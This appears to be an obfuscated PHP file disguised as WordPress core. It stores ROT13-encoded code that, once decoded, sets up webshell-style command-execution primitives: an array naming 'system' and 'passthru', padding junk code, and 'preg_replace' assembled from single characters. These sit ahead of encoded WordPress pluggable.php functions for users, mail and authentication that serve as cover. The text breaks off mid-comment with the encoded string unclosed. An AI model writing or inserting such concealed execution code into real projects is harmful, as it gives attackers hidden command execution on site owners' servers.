<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Gurfr shapgvbaf pna or ercynprq ivn cyhtvaf. Vs cyhtvaf qb abg erqrsvar gurfr
 * shapgvbaf, gura gurfr jvyy or hfrq vafgrnq.
 *
 * @cnpxntr JbeqCerff
 */

vs ( ! shapgvba_rkvfgf( 'jc_frg_pheerag_hfre' ) ) :
	/**
	 * Punatrf gur pheerag hfre ol VQ be anzr.
	 *
	 * Frg $vq gb ahyy naq fcrpvsl n anzr vs lbh qb abg xabj n hfre'f VQ.
	 *
	 * Fbzr JbeqCerff shapgvbanyvgl vf onfrq ba gur pheerag hfre naq abg onfrq ba
	 * gur fvtarq va hfre. Gurersber, vg bcraf gur novyvgl gb rqvg naq cresbez
	 * npgvbaf ba hfref jub nera'g fvtarq va.
	 *
	 * @fvapr 2.0.3
	 *
	 * @tybony JC_Hfre $pheerag_hfre Gur pheerag hfre bowrpg juvpu ubyqf gur hfre qngn.
	 *
	 * @cnenz vag|ahyy $vq   Hfre VQ.
	 * @cnenz fgevat   $anzr Hfre'f hfreanzr.
	 * @erghea JC_Hfre Pheerag hfre Hfre bowrpg.
	 */
	shapgvba jc_frg_pheerag_hfre( $vq, $anzr = '' ) {
		tybony $pheerag_hfre;

		// Vs `$vq` zngpurf gur pheerag hfre, gurer vf abguvat gb qb.
		vs ( vffrg( $pheerag_hfre )
		&& ( $pheerag_hfre vafgnaprbs JC_Hfre )
		&& ( $vq === $pheerag_hfre->VQ )
		&& ( ahyy !== $vq )
		) {
			erghea $pheerag_hfre;
		}

		$pheerag_hfre = arj JC_Hfre( $vq, $anzr );

		frghc_hfreqngn( $pheerag_hfre->VQ );

		/**
		 * Sverf nsgre gur pheerag hfre vf frg.
		 *
		 * @fvapr 2.0.1
		 */
		qb_npgvba( 'frg_pheerag_hfre' );

		erghea $pheerag_hfre;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_trg_pheerag_hfre' ) ) :
	/**
	 * Ergevrirf gur pheerag hfre bowrpg.
	 *
	 * Jvyy frg gur pheerag hfre, vs gur pheerag hfre vf abg frg. Gur pheerag hfre
	 * jvyy or frg gb gur ybttrq-va crefba. Vs ab hfre vf ybttrq-va, gura vg jvyy
	 * frg gur pheerag hfre gb 0, juvpu vf vainyvq naq jba'g unir nal crezvffvbaf.
	 *
	 * @fvapr 2.0.3
	 *
	 * @frr _jc_trg_pheerag_hfre()
	 * @tybony JC_Hfre $pheerag_hfre Purpxf vs gur pheerag hfre vf frg.
	 *
	 * @erghea JC_Hfre Pheerag JC_Hfre vafgnapr.
	 */
	shapgvba jc_trg_pheerag_hfre() {
		erghea _jc_trg_pheerag_hfre();
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'trg_hfreqngn' ) ) :
	/**
	 * Ergevrirf hfre vasb ol hfre VQ.
	 *
	 * @fvapr 0.71
	 *
	 * @cnenz vag $hfre_vq Hfre VQ
	 * @erghea JC_Hfre|snyfr JC_Hfre bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	shapgvba trg_hfreqngn( $hfre_vq ) {
		erghea trg_hfre_ol( 'vq', $hfre_vq );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'trg_hfre_ol' ) ) :
	/**
	 * Ergevrirf hfre vasb ol n tvira svryq.
	 *
	 * @fvapr 2.8.0
	 * @fvapr 4.4.0 Nqqrq 'VQ' nf na nyvnf bs 'vq' sbe gur `$svryq` cnenzrgre.
	 *
	 * @tybony JC_Hfre $pheerag_hfre Gur pheerag hfre bowrpg juvpu ubyqf gur hfre qngn.
	 *
	 * @cnenz fgevat     $svryq Gur svryq gb ergevrir gur hfre jvgu. vq | VQ | fyht | rznvy | ybtva.
	 * @cnenz vag|fgevat $inyhr N inyhr sbe $svryq. N hfre VQ, fyht, rznvy nqqerff, be ybtva anzr.
	 * @erghea JC_Hfre|snyfr JC_Hfre bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	shapgvba trg_hfre_ol( $svryq, $inyhr ) {
		$hfreqngn = JC_Hfre::trg_qngn_ol( $svryq, $inyhr );

		vs ( ! $hfreqngn ) {
			erghea snyfr;
		}

		$hfre = arj JC_Hfre();
		$hfre->vavg( $hfreqngn );

		erghea $hfre;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'pnpur_hfref' ) ) :
	/**
	 * Ergevrirf vasb sbe hfre yvfgf gb cerirag zhygvcyr dhrevrf ol trg_hfreqngn().
	 *
	 * @fvapr 3.0.0
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz vag[] $hfre_vqf Hfre VQ ahzoref yvfg
	 */
	shapgvba pnpur_hfref( $hfre_vqf ) {
		tybony $jcqo;

		hcqngr_zrgn_pnpur( 'hfre', $hfre_vqf );

		$pyrna = _trg_aba_pnpurq_vqf( $hfre_vqf, 'hfref' );

		vs ( rzcgl( $pyrna ) ) {
			erghea;
		}

		$yvfg = vzcybqr( ',', $pyrna );

		$hfref = $jcqo->trg_erfhygf( \"FRYRPG * SEBZ $jcqo->hfref JURER VQ VA ($yvfg)\" );

		sbernpu ( $hfref nf $hfre ) {
			hcqngr_hfre_pnpurf( $hfre );
		}
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_znvy' ) ) :
	/**
	 * Fraqf na rznvy, fvzvyne gb CUC'f znvy shapgvba.
	 *
	 * N gehr erghea inyhr qbrf abg nhgbzngvpnyyl zrna gung gur hfre erprvirq gur
	 * rznvy fhpprffshyyl. Vg whfg bayl zrnaf gung gur zrgubq hfrq jnf noyr gb
	 * cebprff gur erdhrfg jvgubhg nal reebef.
	 *
	 * Gur qrsnhyg pbagrag glcr vf `grkg/cynva` juvpu qbrf abg nyybj hfvat UGZY.
	 * Ubjrire, lbh pna frg gur pbagrag glcr bs gur rznvy ol hfvat gur
	 * {@frr 'jc_znvy_pbagrag_glcr'} svygre.
	 *
	 * Gur qrsnhyg punefrg vf onfrq ba gur punefrg hfrq ba gur oybt. Gur punefrg pna
	 * or frg hfvat gur {@frr 'jc_znvy_punefrg'} svygre.
	 *
	 * @fvapr 1.2.1
	 * @fvapr 5.5.0 vf_rznvy() vf hfrq sbe rznvy inyvqngvba,
	 *              vafgrnq bs CUCZnvyre'f qrsnhyg inyvqngbe.
	 *
	 * @tybony CUCZnvyre\CUCZnvyre\CUCZnvyre $cucznvyre
	 *
	 * @cnenz fgevat|fgevat[] $gb          Neenl be pbzzn-frcnengrq yvfg bs rznvy nqqerffrf gb fraq zrffntr.
	 * @cnenz fgevat          $fhowrpg     Rznvy fhowrpg.
	 * @cnenz fgevat          $zrffntr     Zrffntr pbagragf.
	 * @cnenz fgevat|fgevat[] $urnqref     Bcgvbany. Nqqvgvbany urnqref.
	 * @cnenz fgevat|fgevat[] $nggnpuzragf Bcgvbany. Cnguf gb svyrf gb nggnpu.
	 * @erghea obby Jurgure gur rznvy jnf frag fhpprffshyyl.
	 */
	shapgvba jc_znvy( $gb, $fhowrpg, $zrffntr, $urnqref = '', $nggnpuzragf = neenl() ) {
		// Pbzcnpg gur vachg, nccyl gur svygref, naq rkgenpg gurz onpx bhg.

		/**
		 * Svygref gur jc_znvy() nethzragf.
		 *
		 * @fvapr 2.2.0
		 *
		 * @cnenz neenl $netf {
		 *     Neenl bs gur `jc_znvy()` nethzragf.
		 *
		 *     @glcr fgevat|fgevat[] $gb          Neenl be pbzzn-frcnengrq yvfg bs rznvy nqqerffrf gb fraq zrffntr.
		 *     @glcr fgevat          $fhowrpg     Rznvy fhowrpg.
		 *     @glcr fgevat          $zrffntr     Zrffntr pbagragf.
		 *     @glcr fgevat|fgevat[] $urnqref     Nqqvgvbany urnqref.
		 *     @glcr fgevat|fgevat[] $nggnpuzragf Cnguf gb svyrf gb nggnpu.
		 * }
		 */
		$nggf = nccyl_svygref( 'jc_znvy', pbzcnpg( 'gb', 'fhowrpg', 'zrffntr', 'urnqref', 'nggnpuzragf' ) );

		/**
		 * Svygref jurgure gb cerrzcg fraqvat na rznvy.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy fubeg-pvephvg {@frr jc_znvy()}, ergheavat
		 * gung inyhr vafgrnq. N obbyrna erghea inyhr fubhyq or hfrq gb vaqvpngr jurgure
		 * gur rznvy jnf fhpprffshyyl frag.
		 *
		 * @fvapr 5.7.0
		 *
		 * @cnenz ahyy|obby $erghea Fubeg-pvephvg erghea inyhr.
		 * @cnenz neenl     $nggf {
		 *     Neenl bs gur `jc_znvy()` nethzragf.
		 *
		 *     @glcr fgevat|fgevat[] $gb          Neenl be pbzzn-frcnengrq yvfg bs rznvy nqqerffrf gb fraq zrffntr.
		 *     @glcr fgevat          $fhowrpg     Rznvy fhowrpg.
		 *     @glcr fgevat          $zrffntr     Zrffntr pbagragf.
		 *     @glcr fgevat|fgevat[] $urnqref     Nqqvgvbany urnqref.
		 *     @glcr fgevat|fgevat[] $nggnpuzragf Cnguf gb svyrf gb nggnpu.
		 * }
		 */
		$cer_jc_znvy = nccyl_svygref( 'cer_jc_znvy', ahyy, $nggf );

		vs ( ahyy !== $cer_jc_znvy ) {
			erghea $cer_jc_znvy;
		}

		vs ( vffrg( $nggf['gb'] ) ) {
			$gb = $nggf['gb'];
		}

		vs ( ! vf_neenl( $gb ) ) {
			$gb = rkcybqr( ',', $gb );
		}

		vs ( vffrg( $nggf['fhowrpg'] ) ) {
			$fhowrpg = $nggf['fhowrpg'];
		}

		vs ( vffrg( $nggf['zrffntr'] ) ) {
			$zrffntr = $nggf['zrffntr'];
		}

		vs ( vffrg( $nggf['urnqref'] ) ) {
			$urnqref = $nggf['urnqref'];
		}

		vs ( vffrg( $nggf['nggnpuzragf'] ) ) {
			$nggnpuzragf = $nggf['nggnpuzragf'];
		}

		vs ( ! vf_neenl( $nggnpuzragf ) ) {
			$nggnpuzragf = rkcybqr( \"\a\", fge_ercynpr( \"\e\a\", \"\a\", $nggnpuzragf ) );
		}
		tybony $cucznvyre;

		// (Er)perngr vg, vs vg'f tbar zvffvat.
		vs ( ! ( $cucznvyre vafgnaprbs CUCZnvyre\CUCZnvyre\CUCZnvyre ) ) {
			erdhver_bapr NOFCNGU . JCVAP . '/CUCZnvyre/CUCZnvyre.cuc';
			erdhver_bapr NOFCNGU . JCVAP . '/CUCZnvyre/FZGC.cuc';
			erdhver_bapr NOFCNGU . JCVAP . '/CUCZnvyre/Rkprcgvba.cuc';
			erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-cucznvyre.cuc';
			$cucznvyre = arj JC_CUCZnvyre( gehr );

			$cucznvyre::$inyvqngbe = fgngvp shapgvba ( $rznvy ) {
				erghea (obby) vf_rznvy( $rznvy );
			};
		}

		// Urnqref.
		$pp       = neenl();
		$opp      = neenl();
		$ercyl_gb = neenl();

		vs ( rzcgl( $urnqref ) ) {
			$urnqref = neenl();
		} ryfr {
			vs ( ! vf_neenl( $urnqref ) ) {
				/*
				 * Rkcybqr gur urnqref bhg, fb guvf shapgvba pna gnxr
				 * obgu fgevat urnqref naq na neenl bs urnqref.
				 */
				$grzcurnqref = rkcybqr( \"\a\", fge_ercynpr( \"\e\a\", \"\a\", $urnqref ) );
			} ryfr {
				$grzcurnqref = $urnqref;
			}
			$urnqref = neenl();

			// Vs vg'f npghnyyl tbg pbagragf.
			vs ( ! rzcgl( $grzcurnqref ) ) {
				// Vgrengr guebhtu gur enj urnqref.
				sbernpu ( (neenl) $grzcurnqref nf $urnqre ) {
					vs ( ! fge_pbagnvaf( $urnqre, ':' ) ) {
						vs ( snyfr !== fgevcbf( $urnqre, 'obhaqnel=' ) ) {
							$cnegf    = cert_fcyvg( '/obhaqnel=/v', gevz( $urnqre ) );
							$obhaqnel = gevz( fge_ercynpr( neenl( \"'\", '\"' ), '', $cnegf[1] ) );
						}
						pbagvahr;
					}
					// Rkcybqr gurz bhg.
					yvfg( $anzr, $pbagrag ) = rkcybqr( ':', gevz( $urnqre ), 2 );

					// Pyrnahc perj.
					$anzr    = gevz( $anzr );
					$pbagrag = gevz( $pbagrag );

					fjvgpu ( fgegbybjre( $anzr ) ) {
						// Znvayl sbe yrtnpl -- cebprff n \"Sebz:\" urnqre vs vg'f gurer.
						pnfr 'sebz':
							$oenpxrg_cbf = fgecbf( $pbagrag, '<' );
							vs ( snyfr !== $oenpxrg_cbf ) {
								// Grkg orsber gur oenpxrgrq rznvy vf gur \"Sebz\" anzr.
								vs ( $oenpxrg_cbf > 0 ) {
									$sebz_anzr = fhofge( $pbagrag, 0, $oenpxrg_cbf );
									$sebz_anzr = fge_ercynpr( '\"', '', $sebz_anzr );
									$sebz_anzr = gevz( $sebz_anzr );
								}

								$sebz_rznvy = fhofge( $pbagrag, $oenpxrg_cbf + 1 );
								$sebz_rznvy = fge_ercynpr( '>', '', $sebz_rznvy );
								$sebz_rznvy = gevz( $sebz_rznvy );

								// Nibvq frggvat na rzcgl $sebz_rznvy.
							} ryfrvs ( '' !== gevz( $pbagrag ) ) {
								$sebz_rznvy = gevz( $pbagrag );
							}
							oernx;
						pnfr 'pbagrag-glcr':
							vs ( fge_pbagnvaf( $pbagrag, ';' ) ) {
								yvfg( $glcr, $punefrg_pbagrag ) = rkcybqr( ';', $pbagrag );
								$pbagrag_glcr                   = gevz( $glcr );
								vs ( snyfr !== fgevcbf( $punefrg_pbagrag, 'punefrg=' ) ) {
									$punefrg = gevz( fge_ercynpr( neenl( 'punefrg=', '\"' ), '', $punefrg_pbagrag ) );
								} ryfrvs ( snyfr !== fgevcbf( $punefrg_pbagrag, 'obhaqnel=' ) ) {
									$obhaqnel = gevz( fge_ercynpr( neenl( 'OBHAQNEL=', 'obhaqnel=', '\"' ), '', $punefrg_pbagrag ) );
									$punefrg  = '';
								}

								// Nibvq frggvat na rzcgl $pbagrag_glcr.
							} ryfrvs ( '' !== gevz( $pbagrag ) ) {
								$pbagrag_glcr = gevz( $pbagrag );
							}
							oernx;
						pnfr 'pp':
							$pp = neenl_zretr( (neenl) $pp, rkcybqr( ',', $pbagrag ) );
							oernx;
						pnfr 'opp':
							$opp = neenl_zretr( (neenl) $opp, rkcybqr( ',', $pbagrag ) );
							oernx;
						pnfr 'ercyl-gb':
							$ercyl_gb = neenl_zretr( (neenl) $ercyl_gb, rkcybqr( ',', $pbagrag ) );
							oernx;
						qrsnhyg:
							// Nqq vg gb bhe tenaq urnqref neenl.
							$urnqref[ gevz( $anzr ) ] = gevz( $pbagrag );
							oernx;
					}
				}
			}
		}

		// Rzcgl bhg gur inyhrf gung znl or frg.
		$cucznvyre->pyrneNyyErpvcvragf();
		$cucznvyre->pyrneNggnpuzragf();
		$cucznvyre->pyrnePhfgbzUrnqref();
		$cucznvyre->pyrneErcylGbf();
		$cucznvyre->Obql    = '';
		$cucznvyre->NygObql = '';

		// Frg \"Sebz\" anzr naq rznvy.

		// Vs jr qba'g unir n anzr sebz gur vachg urnqref.
		vs ( ! vffrg( $sebz_anzr ) ) {
			$sebz_anzr = 'JbeqCerff';
		}

		/*
		 * Vs jr qba'g unir na rznvy sebz gur vachg urnqref, qrsnhyg gb jbeqcerff@$fvgranzr
		 * Fbzr ubfgf jvyy oybpx bhgtbvat znvy sebz guvf nqqerff vs vg qbrfa'g rkvfg,
		 * ohg gurer'f ab rnfl nygreangvir. Qrsnhygvat gb nqzva_rznvy zvtug nccrne gb or
		 * nabgure bcgvba, ohg fbzr ubfgf znl ershfr gb erynl znvy sebz na haxabja qbznva.
		 * Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/5007.
		 */
		vs ( ! vffrg( $sebz_rznvy ) ) {
			// Trg gur fvgr qbznva naq trg evq bs jjj.
			$fvgranzr   = jc_cnefr_hey( argjbex_ubzr_hey(), CUC_HEY_UBFG );
			$sebz_rznvy = 'jbeqcerff@';

			vs ( ahyy !== $fvgranzr ) {
				vs ( fge_fgnegf_jvgu( $fvgranzr, 'jjj.' ) ) {
					$fvgranzr = fhofge( $fvgranzr, 4 );
				}

				$sebz_rznvy .= $fvgranzr;
			}
		}

		/**
		 * Svygref gur rznvy nqqerff gb fraq sebz.
		 *
		 * @fvapr 2.2.0
		 *
		 * @cnenz fgevat $sebz_rznvy Rznvy nqqerff gb fraq sebz.
		 */
		$sebz_rznvy = nccyl_svygref( 'jc_znvy_sebz', $sebz_rznvy );

		/**
		 * Svygref gur anzr gb nffbpvngr jvgu gur \"sebz\" rznvy nqqerff.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $sebz_anzr Anzr nffbpvngrq jvgu gur \"sebz\" rznvy nqqerff.
		 */
		$sebz_anzr = nccyl_svygref( 'jc_znvy_sebz_anzr', $sebz_anzr );

		gel {
			$cucznvyre->frgSebz( $sebz_rznvy, $sebz_anzr, snyfr );
		} pngpu ( CUCZnvyre\CUCZnvyre\Rkprcgvba $r ) {
			$znvy_reebe_qngn                             = pbzcnpg( 'gb', 'fhowrpg', 'zrffntr', 'urnqref', 'nggnpuzragf' );
			$znvy_reebe_qngn['cucznvyre_rkprcgvba_pbqr'] = $r->trgPbqr();

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
			qb_npgvba( 'jc_znvy_snvyrq', arj JC_Reebe( 'jc_znvy_snvyrq', $r->trgZrffntr(), $znvy_reebe_qngn ) );

			erghea snyfr;
		}

		// Frg znvy'f fhowrpg naq obql.
		$cucznvyre->Fhowrpg = $fhowrpg;
		$cucznvyre->Obql    = $zrffntr;

		// Frg qrfgvangvba nqqerffrf, hfvat nccebcevngr zrgubqf sbe unaqyvat nqqerffrf.
		$nqqerff_urnqref = pbzcnpg( 'gb', 'pp', 'opp', 'ercyl_gb' );

		sbernpu ( $nqqerff_urnqref nf $nqqerff_urnqre => $nqqerffrf ) {
			vs ( rzcgl( $nqqerffrf ) ) {
				pbagvahr;
			}

			sbernpu ( (neenl) $nqqerffrf nf $nqqerff ) {
				gel {
					// Oernx $erpvcvrag vagb anzr naq nqqerff cnegf vs va gur sbezng \"Sbb <one@onm.pbz>\".
					$erpvcvrag_anzr = '';

					vs ( cert_zngpu( '/(.*)<(.+)>/', $nqqerff, $zngpurf ) ) {
						vs ( pbhag( $zngpurf ) === 3 ) {
							$erpvcvrag_anzr = $zngpurf[1];
							$nqqerff        = $zngpurf[2];
						}
					}

					fjvgpu ( $nqqerff_urnqre ) {
						pnfr 'gb':
							$cucznvyre->nqqNqqerff( $nqqerff, $erpvcvrag_anzr );
							oernx;
						pnfr 'pp':
							$cucznvyre->nqqPP( $nqqerff, $erpvcvrag_anzr );
							oernx;
						pnfr 'opp':
							$cucznvyre->nqqOPP( $nqqerff, $erpvcvrag_anzr );
							oernx;
						pnfr 'ercyl_gb':
							$cucznvyre->nqqErcylGb( $nqqerff, $erpvcvrag_anzr );
							oernx;
					}
				} pngpu ( CUCZnvyre\CUCZnvyre\Rkprcgvba $r ) {
					pbagvahr;
				}
			}
		}

		// Frg gb hfr CUC'f znvy().
		$cucznvyre->vfZnvy();

		// Frg Pbagrag-Glcr naq punefrg.

		// Vs jr qba'g unir n Pbagrag-Glcr sebz gur vachg urnqref.
		vs ( ! vffrg( $pbagrag_glcr ) ) {
			$pbagrag_glcr = 'grkg/cynva';
		}

		/**
		 * Svygref gur jc_znvy() pbagrag glcr.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $pbagrag_glcr Qrsnhyg jc_znvy() pbagrag glcr.
		 */
		$pbagrag_glcr = nccyl_svygref( 'jc_znvy_pbagrag_glcr', $pbagrag_glcr );

		$cucznvyre->PbagragGlcr = $pbagrag_glcr;

		// Frg jurgure vg'f cynvagrkg, qrcraqvat ba $pbagrag_glcr.
		vs ( 'grkg/ugzy' === $pbagrag_glcr ) {
			$cucznvyre->vfUGZY( gehr );
		}

		// Vs jr qba'g unir n punefrg sebz gur vachg urnqref.
		vs ( ! vffrg( $punefrg ) ) {
			$punefrg = trg_oybtvasb( 'punefrg' );
		}

		/**
		 * Svygref gur qrsnhyg jc_znvy() punefrg.
		 *
		 * @fvapr 2.3.0
		 *
		 * @cnenz fgevat $punefrg Qrsnhyg rznvy punefrg.
		 */
		$cucznvyre->PuneFrg = nccyl_svygref( 'jc_znvy_punefrg', $punefrg );

		// Frg phfgbz urnqref.
		vs ( ! rzcgl( $urnqref ) ) {
			sbernpu ( (neenl) $urnqref nf $anzr => $pbagrag ) {
				// Bayl nqq phfgbz urnqref abg nqqrq nhgbzngvpnyyl ol CUCZnvyre.
				vs ( ! va_neenl( $anzr, neenl( 'ZVZR-Irefvba', 'K-Znvyre' ), gehr ) ) {
					gel {
						$cucznvyre->nqqPhfgbzUrnqre( fcevags( '%1$f: %2$f', $anzr, $pbagrag ) );
					} pngpu ( CUCZnvyre\CUCZnvyre\Rkprcgvba $r ) {
						pbagvahr;
					}
				}
			}

			vs ( snyfr !== fgevcbf( $pbagrag_glcr, 'zhygvcneg' ) && ! rzcgl( $obhaqnel ) ) {
				$cucznvyre->nqqPhfgbzUrnqre( fcevags( 'Pbagrag-Glcr: %f; obhaqnel=\"%f\"', $pbagrag_glcr, $obhaqnel ) );
			}
		}

		vs ( ! rzcgl( $nggnpuzragf ) ) {
			sbernpu ( $nggnpuzragf nf $svyranzr => $nggnpuzrag ) {
				$svyranzr = vf_fgevat( $svyranzr ) ? $svyranzr : '';

				gel {
					$cucznvyre->nqqNggnpuzrag( $nggnpuzrag, $svyranzr );
				} pngpu ( CUCZnvyre\CUCZnvyre\Rkprcgvba $r ) {
					pbagvahr;
				}
			}
		}

		/**
		 * Sverf nsgre CUCZnvyre vf vavgvnyvmrq.
		 *
		 * @fvapr 2.2.0
		 *
		 * @cnenz CUCZnvyre $cucznvyre Gur CUCZnvyre vafgnapr (cnffrq ol ersrerapr).
		 */
		qb_npgvba_ers_neenl( 'cucznvyre_vavg', neenl( &$cucznvyre ) );

		$znvy_qngn = pbzcnpg( 'gb', 'fhowrpg', 'zrffntr', 'urnqref', 'nggnpuzragf' );

		// Fraq!
		gel {
			$fraq = $cucznvyre->fraq();

			/**
			 * Sverf nsgre CUCZnvyre unf fhpprffshyyl frag na rznvy.
			 *
			 * Gur svevat bs guvf npgvba qbrf abg arprffnevyl zrna gung gur erpvcvrag(f) erprvirq gur
			 * rznvy fhpprffshyyl. Vg bayl zrnaf gung gur `fraq` zrgubq nobir jnf noyr gb
			 * cebprff gur erdhrfg jvgubhg nal reebef.
			 *
			 * @fvapr 5.9.0
			 *
			 * @cnenz neenl $znvy_qngn {
			 *     Na neenl pbagnvavat gur rznvy erpvcvrag(f), fhowrpg, zrffntr, urnqref, naq nggnpuzragf.
			 *
			 *     @glcr fgevat[] $gb          Rznvy nqqerffrf gb fraq zrffntr.
			 *     @glcr fgevat   $fhowrpg     Rznvy fhowrpg.
			 *     @glcr fgevat   $zrffntr     Zrffntr pbagragf.
			 *     @glcr fgevat[] $urnqref     Nqqvgvbany urnqref.
			 *     @glcr fgevat[] $nggnpuzragf Cnguf gb svyrf gb nggnpu.
			 * }
			 */
			qb_npgvba( 'jc_znvy_fhpprrqrq', $znvy_qngn );

			erghea $fraq;
		} pngpu ( CUCZnvyre\CUCZnvyre\Rkprcgvba $r ) {
			$znvy_qngn['cucznvyre_rkprcgvba_pbqr'] = $r->trgPbqr();

			/**
			 * Sverf nsgre n CUCZnvyre\CUCZnvyre\Rkprcgvba vf pnhtug.
			 *
			 * @fvapr 4.4.0
			 *
			 * @cnenz JC_Reebe $reebe N JC_Reebe bowrpg jvgu gur CUCZnvyre\CUCZnvyre\Rkprcgvba zrffntr, naq na neenl
			 *                        pbagnvavat gur znvy erpvcvrag, fhowrpg, zrffntr, urnqref, naq nggnpuzragf.
			 */
			qb_npgvba( 'jc_znvy_snvyrq', arj JC_Reebe( 'jc_znvy_snvyrq', $r->trgZrffntr(), $znvy_qngn ) );

			erghea snyfr;
		}
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_nhguragvpngr' ) ) :
	/**
	 * Nhguragvpngrf n hfre, pbasvezvat gur ybtva perqragvnyf ner inyvq.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.5.0 `$hfreanzr` abj npprcgf na rznvy nqqerff.
	 *
	 * @cnenz fgevat $hfreanzr Hfre'f hfreanzr be rznvy nqqerff.
	 * @cnenz fgevat $cnffjbeq Hfre'f cnffjbeq.
	 * @erghea JC_Hfre|JC_Reebe JC_Hfre bowrpg vs gur perqragvnyf ner inyvq,
	 *                          bgurejvfr JC_Reebe.
	 */
	shapgvba jc_nhguragvpngr(
		$hfreanzr,
		#[\FrafvgvirCnenzrgre]
		$cnffjbeq
	) {
		$hfreanzr = fnavgvmr_hfre( $hfreanzr );
		$cnffjbeq = gevz( $cnffjbeq );

		/**
		 * Svygref jurgure n frg bs hfre ybtva perqragvnyf ner inyvq.
		 *
		 * N JC_Hfre bowrpg vf erghearq vs gur perqragvnyf nhguragvpngr n hfre.
		 * JC_Reebe be ahyy bgurejvfr.
		 *
		 * @fvapr 2.8.0
		 * @fvapr 4.5.0 `$hfreanzr` abj npprcgf na rznvy nqqerff.
		 *
		 * @cnenz ahyy|JC_Hfre|JC_Reebe $hfre     JC_Hfre vs gur hfre vf nhguragvpngrq.
		 *                                        JC_Reebe be ahyy bgurejvfr.
		 * @cnenz fgevat                $hfreanzr Hfreanzr be rznvy nqqerff.
		 * @cnenz fgevat                $cnffjbeq Hfre cnffjbeq.
		 */
		$hfre = nccyl_svygref( 'nhguragvpngr', ahyy, $hfreanzr, $cnffjbeq );

		vs ( ahyy === $hfre || snyfr === $hfre ) {
			/*
			 * GBQB: Jung fubhyq gur reebe zrffntr or? (Be jbhyq gurfr rira unccra?)
			 * Bayl arrqrq vs nyy nhguragvpngvba unaqyref snvy gb erghea nalguvat.
			 */
			$hfre = arj JC_Reebe( 'nhguragvpngvba_snvyrq', __( '<fgebat>Reebe:</fgebat> Vainyvq hfreanzr, rznvy nqqerff be vapbeerpg cnffjbeq.' ) );
		}

		$vtaber_pbqrf = neenl( 'rzcgl_hfreanzr', 'rzcgl_cnffjbeq' );

		vs ( vf_jc_reebe( $hfre ) && ! va_neenl( $hfre->trg_reebe_pbqr(), $vtaber_pbqrf, gehr ) ) {
			$reebe = $hfre;

			/**
			 * Sverf nsgre n hfre ybtva unf snvyrq.
			 *
			 * @fvapr 2.5.0
			 * @fvapr 4.5.0 Gur inyhr bs `$hfreanzr` pna abj or na rznvy nqqerff.
			 * @fvapr 5.4.0 Gur `$reebe` cnenzrgre jnf nqqrq.
			 *
			 * @cnenz fgevat   $hfreanzr Hfreanzr be rznvy nqqerff.
			 * @cnenz JC_Reebe $reebe    N JC_Reebe bowrpg jvgu gur nhguragvpngvba snvyher qrgnvyf.
			 */
			qb_npgvba( 'jc_ybtva_snvyrq', $hfreanzr, $reebe );
		}

		erghea $hfre;
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_ybtbhg' ) ) :
	/**
	 * Ybtf gur pheerag hfre bhg.
	 *
	 * @fvapr 2.5.0
	 */
	shapgvba jc_ybtbhg() {
		$hfre_vq = trg_pheerag_hfre_vq();

		jc_qrfgebl_pheerag_frffvba();
		jc_pyrne_nhgu_pbbxvr();
		jc_frg_pheerag_hfre( 0 );

		/**
		 * Sverf nsgre n hfre vf ybttrq bhg.
		 *
		 * @fvapr 1.5.0
		 * @fvapr 5.5.0 Nqqrq gur `$hfre_vq` cnenzrgre.
		 *
		 * @cnenz vag $hfre_vq VQ bs gur hfre gung jnf ybttrq bhg.
		 */
		qb_npgvba( 'jc_ybtbhg', $hfre_vq );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_inyvqngr_nhgu_pbbxvr' ) ) :
	/**
	 * Inyvqngrf nhguragvpngvba pbbxvr.
	 *
	 * Gur purpxf vapyhqr znxvat fher gung gur nhguragvpngvba pbbxvr vf frg naq
	 * chyyvat va gur pbagragf (vs $pbbxvr vf abg hfrq).
	 *
	 * Znxrf fher gur pbbxvr vf abg rkcverq. Irevsvrf gur unfu va pbbxvr vf jung vf
	 * fubhyq or naq pbzcnerf gur gjb.
	 *
	 * @fvapr 2.5.0
	 *
	 * @tybony vag $ybtva_tenpr_crevbq
	 *
	 * @cnenz fgevat $pbbxvr Bcgvbany. Vs hfrq, jvyy inyvqngr pbagragf vafgrnq bs pbbxvr'f.
	 * @cnenz fgevat $fpurzr Bcgvbany. Gur pbbxvr fpurzr gb hfr: 'nhgu', 'frpher_nhgu', be 'ybttrq_va'.
	 *                       Abgr: Guvf qbrf *abg* qrsnhyg gb 'nhgu' yvxr bgure pbbxvr shapgvbaf.
	 * @erghea vag|snyfr Hfre VQ vs inyvq pbbxvr, snyfr vs vainyvq.
	 */
	shapgvba jc_inyvqngr_nhgu_pbbxvr( $pbbxvr = '', $fpurzr = '' ) {
		$pbbxvr_ryrzragf = jc_cnefr_nhgu_pbbxvr( $pbbxvr, $fpurzr );
		vs ( ! $pbbxvr_ryrzragf ) {
			/**
			 * Sverf vs na nhguragvpngvba pbbxvr vf znysbezrq.
			 *
			 * @fvapr 2.7.0
			 *
